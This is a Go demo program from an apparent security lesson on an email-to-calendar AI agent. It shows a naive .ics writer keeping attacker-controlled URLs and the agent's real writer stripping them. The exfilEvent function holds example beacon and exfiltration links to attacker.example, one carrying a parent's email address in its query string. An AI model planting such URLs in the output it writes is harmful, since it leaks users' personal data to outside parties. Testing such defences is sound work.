// Command main is the runnable demo for lesson 05.2, the calendar-field exfil.
//
// Run it with:
//
//	go run .
//
// The agent's only output is an inert .ics file. Inert does not mean harmless: a
// URL hidden in an event's location or notes is a beacon that fires when a calendar
// client renders the field, and it can carry data out in its query string. This
// demo writes an event whose fields carry an exfiltration URL with a naive writer
// and finds the URL in the file, then writes the same event with the agent's real
// writer and finds it stripped. Deterministic, no model.
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/t0ul/emaildrop/pkg/agent/ics"
	"github.com/t0ul/emaildrop/pkg/agent/schema"
)

// attackerHost is what must never survive into a calendar file.
const attackerHost = "attacker.example"

// exfilEvent is a plausible event whose fields were poisoned: a tracking beacon in
// the location, and a link in the notes that smuggles a parent's address out.
func exfilEvent() schema.Event {
	ev := schema.New("Book Fair", "2026-10-10T09:00:00")
	ev.Location = "Library http://attacker.example/pixel.gif"
	ev.Notes = "RSVP at http://attacker.example/exfil?who=parent.contact@example.com"
	return ev
}

func main() {
	leaked := naiveLeaks()
	blocked := writerStrips()

	fmt.Println()
	if leaked && blocked {
		fmt.Println("attack blocked (the receipt): the beacon survives a naive writer, stripped by the real one")
	} else {
		fmt.Println("a control did not hold")
		os.Exit(1)
	}
}

// ---- before: a naive writer puts the fields in as-is ----

// naiveICS is the calendar writer I would write first: take the event's fields and
// put them straight into the .ics. It is a faithful serializer, which is exactly
// the problem, because the fields are attacker-controlled.
func naiveICS(ev schema.Event) string {
	var b strings.Builder
	b.WriteString("BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\n")
	fmt.Fprintf(&b, "SUMMARY:%s\r\n", ev.Title)
	fmt.Fprintf(&b, "LOCATION:%s\r\n", ev.Location)
	fmt.Fprintf(&b, "DESCRIPTION:%s\r\n", ev.Notes)
	b.WriteString("END:VEVENT\r\nEND:VCALENDAR\r\n")
	return b.String()
}

func naiveLeaks() bool {
	fmt.Println("== before: a naive calendar writer ==")
	text := naiveICS(exfilEvent())
	for _, l := range lines(text, "LOCATION", "DESCRIPTION") {
		fmt.Printf("  %s\n", l)
	}
	present := strings.Contains(text, attackerHost)
	fmt.Printf("  the beacon host %q is in the file: %v (it fires when the event is rendered)\n", attackerHost, present)
	return present
}

// ---- after: the agent's real writer sanitizes every field ----

func writerStrips() bool {
	fmt.Println("\n== after: the agent's real ics.Write ==")
	text, removed, err := ics.Write([]schema.Event{exfilEvent()}, "email-to-calendar")
	if err != nil {
		panic(err)
	}
	for _, l := range lines(text, "LOCATION", "DESCRIPTION") {
		fmt.Printf("  %s\n", l)
	}
	present := strings.Contains(text, attackerHost)
	fmt.Printf("  links/schemes removed: %d; the beacon host in the file: %v\n", removed, present)
	return !present
}

// ---- helpers ----

func lines(text string, prefixes ...string) []string {
	var out []string
	for _, l := range strings.Split(text, "\r\n") {
		for _, p := range prefixes {
			if strings.HasPrefix(l, p) {
				out = append(out, l)
			}
		}
	}
	return out
}
